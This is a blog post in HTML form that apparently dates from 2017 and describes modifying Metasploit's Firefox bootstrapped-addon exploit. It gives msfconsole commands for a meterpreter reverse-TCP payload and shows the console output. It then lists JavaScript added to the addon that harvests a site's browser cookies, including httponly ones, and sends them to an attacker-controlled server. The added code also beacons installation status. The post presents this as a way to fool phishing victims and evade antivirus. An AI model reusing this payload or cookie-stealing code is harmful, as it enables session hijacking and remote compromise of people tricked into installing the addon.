<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Adding new skills to the Metasploit Firefox addon" />
<meta property="og:locale" content="en" />
<meta name="description" content="I have been modifying the firefox_xpi_bootstrapped_addon exploit of Metasploit to add some new skills that were necessary to make it more real (for SE) and successful." />
<meta property="og:description" content="I have been modifying the firefox_xpi_bootstrapped_addon exploit of Metasploit to add some new skills that were necessary to make it more real (for SE) and successful." />
<link rel="canonical" href="https://spamv.github.io/octority/2017/02/23/adding-new-skills-to-the-meterpreter-firefox-addon/" />
<meta property="og:url" content="https://spamv.github.io/octority/2017/02/23/adding-new-skills-to-the-meterpreter-firefox-addon/" />
<meta property="og:site_name" content="Octopus Security" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2017-02-23T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Adding new skills to the Metasploit Firefox addon" />
<meta name="twitter:site" content="@Spamv" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2017-02-23T00:00:00+01:00","datePublished":"2017-02-23T00:00:00+01:00","description":"I have been modifying the firefox_xpi_bootstrapped_addon exploit of Metasploit to add some new skills that were necessary to make it more real (for SE) and successful.","headline":"Adding new skills to the Metasploit Firefox addon","mainEntityOfPage":{"@type":"WebPage","@id":"https://spamv.github.io/octority/2017/02/23/adding-new-skills-to-the-meterpreter-firefox-addon/"},"url":"https://spamv.github.io/octority/2017/02/23/adding-new-skills-to-the-meterpreter-firefox-addon/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Adding new skills to the Metasploit Firefox addon | Octopus Security
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/octority/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/octority/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/octority/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/octority/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/octority/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Octopus Security">
<meta name="application-name" content="Octopus Security">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/octority/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <link rel="stylesheet" href="/octority/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
    <!-- Switch the mode between dark and light. -->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() {
      return 'mode';
    }
    static get MODE_ATTR() {
      return 'data-mode';
    }
    static get DARK_MODE() {
      return 'dark';
    }
    static get LIGHT_MODE() {
      return 'light';
    }
    static get ID() {
      return 'mode-toggle';
    }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener('change', () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }
          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();
      });
    } /* constructor() */

    get sysDarkPrefers() {
      return window.matchMedia('(prefers-color-scheme: dark)');
    }

    get isSysDarkPrefer() {
      return this.sysDarkPrefers.matches;
    }

    get isDarkMode() {
      return this.mode === ModeToggle.DARK_MODE;
    }

    get isLightMode() {
      return this.mode === ModeToggle.LIGHT_MODE;
    }

    get hasMode() {
      return this.mode != null;
    }

    get mode() {
      return sessionStorage.getItem(ModeToggle.MODE_KEY);
    }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage(
        {
          direction: ModeToggle.ID,
          message: this.modeStatus
        },
        '*'
      );
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }
        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }
      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.notify();
    } /* flipMode() */
  } /* ModeToggle */

  const modeToggle = new ModeToggle();
</script>

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-center">
    <header class="profile-wrapper">
        <a href="/octority/" id="avatar">
            
            
            <img src="/octority/assets/images/logo_square.png" width="112" height="112" alt="avatar"
                onerror="this.style.display='none'">
            
        </a>

        <h1 class="site-title">
            <a href="/octority/">Octopus Security</a>
        </h1>
        <!-- <p class="site-subtitle fst-italic mb-0">A text-focused Jekyll theme</p> -->
    </header>
    <!-- .profile-wrapper -->

    <nav class="flex-column flex-grow-1 w-100 ps-0">
        <ul class="nav">
            <!-- home -->
            <li class="nav-item">
                <a href="/octority/" class="nav-link">
                    <i class="fa-fw fas fa-home"></i>
                    <span>HOME</span>
                </a>
            </li>
            <!-- the real tabs -->
            
            <li class="nav-item">
                <a href="/octority/categories/" class="nav-link">
                    <i class="fa-fw fas fa-stream"></i>
                    

                    <span>CATEGORIES</span>
                </a>
            </li>
            <!-- .nav-item -->
            
            <li class="nav-item">
                <a href="/octority/tags/" class="nav-link">
                    <i class="fa-fw fas fa-tags"></i>
                    

                    <span>TAGS</span>
                </a>
            </li>
            <!-- .nav-item -->
            
            <li class="nav-item">
                <a href="/octority/archives/" class="nav-link">
                    <i class="fa-fw fas fa-archive"></i>
                    

                    <span>ARCHIVES</span>
                </a>
            </li>
            <!-- .nav-item -->
            
            <li class="nav-item">
                <a href="/octority/about/" class="nav-link">
                    <i class="fa-fw fas fa-info-circle"></i>
                    

                    <span>ABOUT</span>
                </a>
            </li>
            <!-- .nav-item -->
            

            <!-- Pepenote -->
            <li class="nav-item">
                <a href="/octority/pepenote/" class="nav-link">
                    <i class="fa-fw fas fa-sticky-note"></i>
                    <span>PEPENOTE</span>
                </a>
            </li>

        </ul>
    </nav>

    <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
        
        <button type="button" class="mode-toggle btn" aria-label="Switch Mode">
            <i class="fas fa-adjust"></i>
        </button>

        
        <span class="icon-border"></span>
        
        

        
        

        
        <a href="https://github.com/github_username" aria-label="github"  
            target="_blank"    
            rel="noopener noreferrer" >
            <i class="fab fa-github"></i>
        </a>
        
        
        

        
        <a href="https://twitter.com/Spamv" aria-label="twitter"  
            target="_blank"    
            rel="noopener noreferrer" >
            <i class="fa-brands fa-x-twitter"></i>
        </a>
        
        
    </div>
    <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/octority/">
                Home
              </a>
            </span>

          
        
          
        
          
        
          
        
          
            
              <span>Adding new skills to the Metasploit Firefox addon</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- add class to exist <a> tag -->
        
        
        

      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Adding new skills to the Metasploit Firefox addon</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1487804400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb 23, 2017
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/username">your_full_name</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="769 words"
>
  <em>4 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>I have been modifying the <strong>firefox_xpi_bootstrapped_addon</strong> exploit of Metasploit to add some new skills that were necessary to make it more real (for SE) and successful.</p>

<p>From the beginning: Firefox uses .xpi extensions, in this case uses the restless method, which is able to install the addon and execute it without rebooting the browser. <a href="https://developer.mozilla.org/en-US/Add-ons/Bootstrapped_extensions">Here</a> you have more info about the Mozilla Bootstrap addons.</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th><a href="https://2.bp.blogspot.com/-l1B3LbW9hDo/WJo9XcExsCI/AAAAAAAAABk/V-AeTmsHjSUrfRTRNpNiOm12zsq1ruRvACLcB/s1600/2017-02-07%2B22_00_01-about_config.png"
          class="img-link shimmer"
        ><img src="/octority/assets/images/2017-02-23-adding-new-skills-to-the-meterpreter-firefox-addon/2017-02-07%2B22_00_01-about_config.png" alt="" loading="lazy"></a></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Signatures not required</td>
    </tr>
  </tbody>
</table></div>

<p>The bad news: The last versions of Firefox have the xpinstall.signatures.required flag enabled, and we have to disable it if we want to execute unsigned ones. So by default it’s only possible to execute addons signed by Mozilla (previous review).</p>

<p>The worst news: In future versions of Firefox it will not be possible to disable the signatures, and only Mozilla signed addons could be executed.</p>

<p>The good news: Special versions of Firefox ESR will still have the xpinstall flag in the about:config. Many companies disable it to execute their own plugins. (In this case Mozilla offers the possibility to sign it and store it in a local repository, not the public market) <a href="https://wiki.mozilla.org/Add-ons/Extension_Signing"></a><a href="https://wiki.mozilla.org/Add-ons/Extension_Signing">Here</a> you have more info about the signatures and versions.</p>

<p>This is the MSF exploit that we are going to use:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>use exploit/multi/browser/firefox_xpi_bootstrapped_addon
set payload windows/meterpreter/reverse_tcp_rc4
set lhost 192.168.0.102
set lport 4444
set rc4password pepe
set addonname addon_name
set uripath addon
run
</pre></td></tr></tbody></table></code></div></div>

<p>Once executed it creates a webserver with the plugin</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>root@kali:~/Desktop/blog# msfconsole -r addon_windows 
[*] Exploit running as background job.
[*] Started reverse TCP handler on 192.168.0.102:4444 
[*] Using URL: http://0.0.0.0:8080/addon
[*] Local IP: http://192.168.0.102:8080/addon
[*] Server started.&lt;span style="color: #005fd2; font-size: x-small;" data-mce-style="color: #005fd2; font-size: x-small;"&gt;&lt;/span&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Downloading and unziping the addon</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>msf exploit(firefox_xpi_bootstrapped_addon) &gt; wget http://192.168.0.102:8080/addon/addon.xpi
addon.xpi           100%[===================&gt;]   2.98K  --.-KB/s    in 0s      
2017-02-07 17:04:01 (269 MB/s) - �addon.xpi’ saved [3047/3047]
msf exploit(firefox_xpi_bootstrapped_addon) &gt; exit
[*] Server stopped.
root@kali:~/Desktop/blog# ls
addon_windows  addon.xpi
root@kali:~/Desktop/blog# unzip addon.xpi 
Archive:  addon.xpi
  inflating: bootstrap.js            
  inflating: chrome.manifest         
  inflating: install.rdf             
  inflating: overlay.xul
</pre></td></tr></tbody></table></code></div></div>

<p>Now the funny part, what we want to do? - We want to know when the user executes the addon. - We want to get all his cookies (all the cookies of the browser, doesn’t matter if they have httponly).</p>

<p>Why? - Because in a phishing attack, it will be very suspicious to execute a plugin that doesn’t do anything. Once the user installs it, we set a cookie that the Javascript code in the client side will read and make some action. - Because it’s very powerful getting all the cookies in that easy way, and at least we could still have them in the worst case that the RCE exploit fails for any reason.</p>

<p>We are not going to explain all the Metasploit payload, just the code we added.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>/* Added MT */
const {classes: Cc, interfaces: Ci, utils: Cu} = Components;
const request = Cu.import('resource://gre/modules/Http.jsm').httpRequest;
Components.utils.import("resource://gre/modules/Services.jsm");
/* Added MT */
 
function startup(data, reason) {
 /* Added MT */
 var cookieService = Services.cookies;
 let cookieEnumerator = cookieService.getCookiesFromHost('xxxxx.com');
 let cookiee = cookieEnumerator.getNext().QueryInterface(Ci.nsICookie2);
 let totalcookies = '';
 let options = {method: "GET"};
 while (cookieEnumerator.hasMoreElements()) {
  let cookiee = cookieEnumerator.getNext().QueryInterface(Ci.nsICookie2); 
  let cookieall = "host=" + cookiee.host + "&amp;" + cookiee.name + "=" + cookiee.value;
  //Services.prompt.alert(null, "Title", cookieall);
  httpRequest("http://192.168.0.102:4040/cookies.php?" + cookieall, options);
 }
 var expires = ((new Date()).getTime() / 1000) + 60 * 60 * 224; //today + 224hours
 cookieService.add('192.168.0.101', '/', 'addoinst', 'yes', false, false, false, expires);
 let cookie = 'status=OK2';
 httpRequest("http://192.168.0.102:4040/status.php?" + cookie, options);
 /* Added MT */
</pre></td></tr></tbody></table></code></div></div>

<p> </p>

<p>- In firs place we enumerate all the cookies of the selected domain, and we send them via GET to our external server. It could be also possible to concatenate all of them and send it via POST. (In this case all the user cookies are sent by HTTP so it’s not recommendable at all to use unsecure protocols) - We create a cookie to be checked by the JavaScript code on client side. - We also send a request to the server to know that this user executed the plugin.</p>

<p>With this little tricks it’s easy to evade AV as it’s executed on Firefox directly and the stage is encrypted with RC4, it’s easy to fool the users as you can make post execution actions, and easy to get all the cookies as a bonus.</p>

<p>The code works well, but we have not tested it very hard, so we are not responsible for any misuse.</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/octority/categories/client-side-attacks/">client-side-attacks</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/octority/tags/exploit/"
            class="post-tag no-text-decoration"
          >exploit</a>
        
          <a
            href="/octority/tags/firefox/"
            class="post-tag no-text-decoration"
          >firefox</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted me-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
      <a
        href="https://twitter.com/intent/tweet?text=Adding%20new%20skills%20to%20the%20Metasploit%20Firefox%20addon%20-%20Octopus%20Security&url=https%3A%2F%2Fspamv.github.io%2Foctority%2F2017%2F02%2F23%2Fadding-new-skills-to-the-meterpreter-firefox-addon%2F"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Twitter"
        target="_blank"
        rel="noopener"
        aria-label="Twitter"
      >
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    
      
      <a
        href="https://www.facebook.com/sharer/sharer.php?title=Adding%20new%20skills%20to%20the%20Metasploit%20Firefox%20addon%20-%20Octopus%20Security&u=https%3A%2F%2Fspamv.github.io%2Foctority%2F2017%2F02%2F23%2Fadding-new-skills-to-the-meterpreter-firefox-addon%2F"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Facebook"
        target="_blank"
        rel="noopener"
        aria-label="Facebook"
      >
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    
      
      <a
        href="https://t.me/share/url?url=https%3A%2F%2Fspamv.github.io%2Foctority%2F2017%2F02%2F23%2Fadding-new-skills-to-the-meterpreter-firefox-addon%2F&text=Adding%20new%20skills%20to%20the%20Metasploit%20Firefox%20addon%20-%20Octopus%20Security"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Telegram"
        target="_blank"
        rel="noopener"
        aria-label="Telegram"
      >
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/ctf/">ctf</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/radare/">radare</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/reverse-engineering/">reverse-engineering</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/metasploit/">metasploit</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/cc/">cc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/couchdb/">couchdb</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/dll-injection/">dll-injection</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/exploit/">exploit</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/firefox/">firefox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/raspberry-pi/">raspberry-pi</a>
      
    </div>
  </section>


            </div>

            
              
              




            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/octority/2017/03/22/manage-metasploit-listeners-with-tmux/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1490137200"
  data-df="ll"
  
>
  Mar 22, 2017
</time>

              <h4 class="pt-0 my-2">Manage metasploit listeners with Tmux</h4>
              <div class="text-muted">
                <p>
                  





                  In order to have listeners always ready on the C&amp;amp;C and have access easily through SSH we will use Tmux. Tmux is a powerful alternative to the Screen command, included in multiple Linux distribu...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/octority/2017/03/29/removing-infection-modifying-metasploit-post-modules/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1490738400"
  data-df="ll"
  
>
  Mar 29, 2017
</time>

              <h4 class="pt-0 my-2">Removing infection modifying Metasploit post modules</h4>
              <div class="text-muted">
                <p>
                  





                  The main objective is to remove the persistence of an attack creating a new process. We could do it executing directly a bash command concatenating all in just one line, in order to execute it befo...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/octority/2017/02/20/reverse-engineering-crackme-with-radare2-crackme0x00a/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Crackme with Radare2 (crackme0x00a)</p>
    </a>
  

  
    <a
      href="/octority/2017/02/23/crackme-challenge-resolution-with-radare2-crackme0x01/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Crackme challenge resolution with Radare2 (crackme0x01)</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer aria-label="Site Info" class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  ">
    <p>
        © 2025 Spamv. Some rights reserved.
    </p>

    <p>
        <a href="https://x.com/Spamv" target="_blank" rel="noopener">
            <i class="fab fa-twitter"></i>
        </a>
    </p>
</footer>
          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/ctf/">ctf</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/octority/tags/radare/">radare</a>
      
        
